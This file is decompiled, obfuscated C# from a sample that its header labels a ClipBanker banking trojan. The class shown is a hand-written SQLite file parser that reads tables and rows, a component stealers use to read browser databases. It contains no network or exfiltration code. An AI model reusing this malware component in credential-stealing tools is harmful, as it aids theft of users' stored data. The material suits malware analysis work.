// Decompiled with JetBrains decompiler
// Type: s57.174
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace s57
{
  internal sealed class \u003174
  {
    private readonly byte[] \u003661;
    private readonly ulong \u0034Y3;
    private readonly byte[] Dy6;
    private readonly ulong \u0039Cm;
    public string[] \u0031kB;
    private \u003174.J75[] JRk;
    private \u003174.RP8[] D65;

    [SpecialName]
    public int \u0036zn() => this.s62();

    public \u003174([In] string obj0)
    {
      this.\u003661 = new byte[18]
      {
        (byte) 0,
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 6,
        (byte) 8,
        (byte) 8,
        (byte) 0,
        (byte) 0,
        (byte) 2,
        (byte) 1,
        (byte) 4,
        (byte) 3,
        (byte) 2,
        (byte) 5,
        (byte) 1,
        (byte) 2
      };
      this.Dy6 = File.ReadAllBytes(obj0);
      this.\u0039Cm = this.\u003532(16, 2);
      this.\u0034Y3 = this.\u003532(56, 4);
      this.\u00327g(100L);
    }

    public string vg9([In] int obj0, [In] string obj1)
    {
      string str;
      try
      {
        int num1 = -1;
        int num2 = this.\u0031kB.Length - 1;
        for (int index = 0; index <= num2; ++index)
        {
          if (this.\u0031kB[index].ToLower().Trim().CompareTo(obj1.ToLower().Trim()) == 0)
          {
            num1 = index;
            break;
          }
        }
        str = num1 != -1 ? this.K2c(obj0, num1) : (string) null;
      }
      catch
      {
        str = (string) null;
      }
      return str;
    }

    public string K2c([In] int obj0, [In] int obj1)
    {
      string str;
      try
      {
        str = obj0 < this.D65.Length ? (obj1 >= this.D65[obj0].iog.Length ? (string) null : this.D65[obj0].iog[obj1]) : (string) null;
      }
      catch
      {
        str = "";
      }
      return str;
    }

    public int s62() => this.D65.Length;

    private bool \u003327([In] ulong obj0)
    {
      bool flag;
      try
      {
        if (this.Dy6[(int) (IntPtr) checked ((long) obj0)] == (byte) 13)
        {
          uint num1 = (uint) Decimal.Subtract(new Decimal(this.\u003532(Convert.ToInt32(Decimal.Add(new Decimal(obj0), 3M)), 2)), 1M);
          int num2 = 0;
          if (this.D65 != null)
          {
            num2 = this.D65.Length;
            Array.Resize<\u003174.RP8>(ref this.D65, this.D65.Length + (int) num1 + 1);
          }
          else
            this.D65 = new \u003174.RP8[(int) num1 + 1];
          for (uint index1 = 0; index1 <= num1; ++index1)
          {
            ulong num3 = this.\u003532((int) obj0 + 8 + (int) index1 * 2, 2);
            if (obj0 != 100UL)
              num3 += obj0;
            int num4 = this.\u003143((int) num3);
            this.K22((int) num3, num4);
            int num5 = this.\u003143((int) ((long) num3 + ((long) num4 - (long) num3) + 1L));
            this.K22((int) ((long) num3 + ((long) num4 - (long) num3) + 1L), num5);
            ulong num6 = num3 + (ulong) ((long) num5 - (long) num3 + 1L);
            int num7 = this.\u003143((int) num6);
            int num8 = num7;
            long num9 = this.K22((int) num6, num7);
            \u003174.S7k[] array = (\u003174.S7k[]) null;
            long num10 = (long) num6 - (long) num7 + 1L;
            int index2 = 0;
            while (num10 < num9)
            {
              Array.Resize<\u003174.S7k>(ref array, index2 + 1);
              int num11 = num8 + 1;
              num8 = this.\u003143(num11);
              array[index2].\u0032Ed = this.K22(num11, num8);
              array[index2].r6S = array[index2].\u0032Ed <= 9L ? (long) this.\u003661[(int) (IntPtr) array[index2].\u0032Ed] : (!\u003174.hCU(array[index2].\u0032Ed) ? (array[index2].\u0032Ed - 12L) / 2L : (array[index2].\u0032Ed - 13L) / 2L);
              num10 = num10 + (long) (num8 - num11) + 1L;
              ++index2;
            }
            if (array != null)
            {
              this.D65[num2 + (int) index1].iog = new string[array.Length];
              int num12 = 0;
              for (int index3 = 0; index3 <= array.Length - 1; ++index3)
              {
                if (array[index3].\u0032Ed > 9L)
                {
                  if (!\u003174.hCU(array[index3].\u0032Ed))
                  {
                    if (this.\u0034Y3 == 1UL)
                      this.D65[num2 + (int) index1].iog[index3] = Encoding.GetEncoding("windows-1251").GetString(this.Dy6, (int) ((long) num6 + num9 + (long) num12), (int) array[index3].r6S);
                    else if (this.\u0034Y3 == 2UL)
                      this.D65[num2 + (int) index1].iog[index3] = Encoding.Unicode.GetString(this.Dy6, (int) ((long) num6 + num9 + (long) num12), (int) array[index3].r6S);
                    else if (this.\u0034Y3 == 3UL)
                      this.D65[num2 + (int) index1].iog[index3] = Encoding.BigEndianUnicode.GetString(this.Dy6, (int) ((long) num6 + num9 + (long) num12), (int) array[index3].r6S);
                  }
                  else
                    this.D65[num2 + (int) index1].iog[index3] = Encoding.GetEncoding("windows-1251").GetString(this.Dy6, (int) ((long) num6 + num9 + (long) num12), (int) array[index3].r6S);
                }
                else
                  this.D65[num2 + (int) index1].iog[index3] = Convert.ToString(this.\u003532((int) ((long) num6 + num9 + (long) num12), (int) array[index3].r6S));
                num12 += (int) array[index3].r6S;
              }
            }
          }
        }
        else if (this.Dy6[(int) (IntPtr) checked ((long) obj0)] == (byte) 5)
        {
          uint num13 = (uint) (this.\u003532((int) ((long) obj0 + 3L), 2) - 1UL);
          for (uint index = 0; index <= num13; ++index)
          {
            uint num14 = (uint) this.\u003532((int) obj0 + 12 + (int) index * 2, 2);
            this.\u003327((this.\u003532((int) ((long) obj0 + (long) num14), 4) - 1UL) * this.\u0039Cm);
          }
          this.\u003327((this.\u003532((int) ((long) obj0 + 8L), 4) - 1UL) * this.\u0039Cm);
        }
        flag = true;
      }
      catch
      {
        flag = false;
      }
      return flag;
    }

    private void \u00327g([In] long obj0)
    {
      try
      {
        switch (this.Dy6[(int) (IntPtr) obj0])
        {
          case 5:
            uint num1 = (uint) (this.\u003532((int) obj0 + 3, 2) - 1UL);
            for (int index = 0; index <= (int) num1; ++index)
            {
              uint num2 = (uint) this.\u003532((int) obj0 + 12 + index * 2, 2);
              if (obj0 == 100L)
                this.\u00327g(((long) this.\u003532((int) num2, 4) - 1L) * (long) this.\u0039Cm);
              else
                this.\u00327g(((long) this.\u003532((int) (obj0 + (long) num2), 4) - 1L) * (long) this.\u0039Cm);
            }
            this.\u00327g(((long) this.\u003532((int) obj0 + 8, 4) - 1L) * (long) this.\u0039Cm);
            break;
          case 13:
            ulong num3 = this.\u003532((int) obj0 + 3, 2) - 1UL;
            int num4 = 0;
            if (this.JRk != null)
            {
              num4 = this.JRk.Length;
              Array.Resize<\u003174.J75>(ref this.JRk, this.JRk.Length + (int) num3 + 1);
            }
            else
              this.JRk = new \u003174.J75[checked ((ulong) unchecked ((long) num3 + 1L))];
            for (ulong index1 = 0; index1 <= num3; ++index1)
            {
              ulong num5 = this.\u003532((int) obj0 + 8 + (int) index1 * 2, 2);
              if (obj0 != 100L)
                num5 += (ulong) obj0;
              int num6 = this.\u003143((int) num5);
              this.K22((int) num5, num6);
              int num7 = this.\u003143((int) ((long) num5 + ((long) num6 - (long) num5) + 1L));
              this.K22((int) ((long) num5 + ((long) num6 - (long) num5) + 1L), num7);
              ulong num8 = num5 + (ulong) ((long) num7 - (long) num5 + 1L);
              int num9 = this.\u003143((int) num8);
              int num10 = num9;
              long num11 = this.K22((int) num8, num9);
              long[] numArray = new long[5];
              for (int index2 = 0; index2 <= 4; ++index2)
              {
                int num12 = num10 + 1;
                num10 = this.\u003143(num12);
                numArray[index2] = this.K22(num12, num10);
                numArray[index2] = numArray[index2] <= 9L ? (long) this.\u003661[(int) (IntPtr) numArray[index2]] : (!\u003174.hCU(numArray[index2]) ? (numArray[index2] - 12L) / 2L : (numArray[index2] - 13L) / 2L);
              }
              if (this.\u0034Y3 == 1UL || this.\u0034Y3 == 2UL)
              {
                if (this.\u0034Y3 == 1UL)
                  this.JRk[num4 + (int) index1].\u0036UQ = Encoding.GetEncoding("windows-1251").GetString(this.Dy6, (int) ((long) num8 + num11 + numArray[0]), (int) numArray[1]);
                else if (this.\u0034Y3 == 2UL)
                  this.JRk[num4 + (int) index1].\u0036UQ = Encoding.Unicode.GetString(this.Dy6, (int) ((long) num8 + num11 + numArray[0]), (int) numArray[1]);
                else if (this.\u0034Y3 == 3UL)
                  this.JRk[num4 + (int) index1].\u0036UQ = Encoding.BigEndianUnicode.GetString(this.Dy6, (int) ((long) num8 + num11 + numArray[0]), (int) numArray[1]);
              }
              this.JRk[num4 + (int) index1].\u0031Js = (long) this.\u003532((int) ((long) num8 + num11 + numArray[0] + numArray[1] + numArray[2]), (int) numArray[3]);
              if (this.\u0034Y3 == 1UL)
                this.JRk[num4 + (int) index1].\u003691 = Encoding.GetEncoding("windows-1251").GetString(this.Dy6, (int) ((long) num8 + num11 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int) numArray[4]);
              else if (this.\u0034Y3 == 2UL)
                this.JRk[num4 + (int) index1].\u003691 = Encoding.Unicode.GetString(this.Dy6, (int) ((long) num8 + num11 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int) numArray[4]);
              else if (this.\u0034Y3 == 3UL)
                this.JRk[num4 + (int) index1].\u003691 = Encoding.BigEndianUnicode.GetString(this.Dy6, (int) ((long) num8 + num11 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int) numArray[4]);
            }
            break;
        }
      }
      catch
      {
      }
    }

    public bool \u00388t([In] string obj0)
    {
      bool flag;
      try
      {
        int index1 = -1;
        for (int index2 = 0; index2 <= this.JRk.Length; ++index2)
        {
          if (string.Compare(this.JRk[index2].\u0036UQ.ToLower(), obj0.ToLower(), StringComparison.Ordinal) == 0)
          {
            index1 = index2;
            break;
          }
        }
        if (index1 == -1)
        {
          flag = false;
        }
        else
        {
          string[] strArray = this.JRk[index1].\u003691.Substring(this.JRk[index1].\u003691.IndexOf("(", StringComparison.Ordinal) + 1).Split(',');
          for (int index3 = 0; index3 <= strArray.Length - 1; ++index3)
          {
            strArray[index3] = strArray[index3].TrimStart();
            int length = strArray[index3].IndexOf(' ');
            if (length > 0)
              strArray[index3] = strArray[index3].Substring(0, length);
            if (strArray[index3].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
            {
              Array.Resize<string>(ref this.\u0031kB, index3 + 1);
              this.\u0031kB[index3] = strArray[index3];
            }
          }
          flag = this.\u003327((ulong) (this.JRk[index1].\u0031Js - 1L) * this.\u0039Cm);
        }
      }
      catch
      {
        flag = false;
      }
      return flag;
    }

    private ulong \u003532([In] int obj0, [In] int obj1)
    {
      ulong num1;
      try
      {
        if (obj1 > 8 | obj1 == 0)
        {
          num1 = 0UL;
        }
        else
        {
          ulong num2 = 0;
          for (int index = 0; index <= obj1 - 1; ++index)
            num2 = num2 << 8 | (ulong) this.Dy6[obj0 + index];
          num1 = num2;
        }
      }
      catch
      {
        num1 = 0UL;
      }
      return num1;
    }

    private int \u003143([In] int obj0)
    {
      int num;
      try
      {
        if (obj0 > this.Dy6.Length)
        {
          num = 0;
        }
        else
        {
          for (int index = obj0; index <= obj0 + 8; ++index)
          {
            if (index > this.Dy6.Length - 1)
              return 0;
            if (((int) this.Dy6[index] & 128) != 128)
              return index;
          }
          num = obj0 + 8;
        }
      }
      catch
      {
        num = 0;
      }
      return num;
    }

    private long K22([In] int obj0, [In] int obj1)
    {
      long num1;
      try
      {
        ++obj1;
        byte[] numArray = new byte[8];
        int num2 = obj1 - obj0;
        bool flag = false;
        if (num2 == 0 | num2 > 9)
        {
          num1 = 0L;
        }
        else
        {
          switch (num2)
          {
            case 1:
              numArray[0] = (byte) ((uint) this.Dy6[obj0] & (uint) sbyte.MaxValue);
              num1 = BitConverter.ToInt64(numArray, 0);
              goto label_17;
            case 9:
              flag = true;
              break;
          }
          int num3 = 1;
          int num4 = 7;
          int index1 = 0;
          if (flag)
          {
            numArray[0] = this.Dy6[obj1 - 1];
            --obj1;
            index1 = 1;
          }
          for (int index2 = obj1 - 1; index2 >= obj0; index2 += -1)
          {
            if (index2 - 1 >= obj0)
            {
              numArray[index1] = (byte) ((int) this.Dy6[index2] >> num3 - 1 & (int) byte.MaxValue >> num3 | (int) this.Dy6[index2 - 1] << num4);
              ++num3;
              ++index1;
              --num4;
            }
            else if (!flag)
              numArray[index1] = (byte) ((int) this.Dy6[index2] >> num3 - 1 & (int) byte.MaxValue >> num3);
          }
          num1 = BitConverter.ToInt64(numArray, 0);
        }
      }
      catch
      {
        num1 = 0L;
      }
label_17:
      return num1;
    }

    private static bool hCU([In] long obj0) => (obj0 & 1L) == 1L;

    private struct J75
    {
      public string \u0036UQ;
      public long \u0031Js;
      public string \u003691;
    }

    private struct RP8
    {
      public string[] iog;
    }

    private struct S7k
    {
      public long r6S;
      public long \u0032Ed;
    }
  }
}
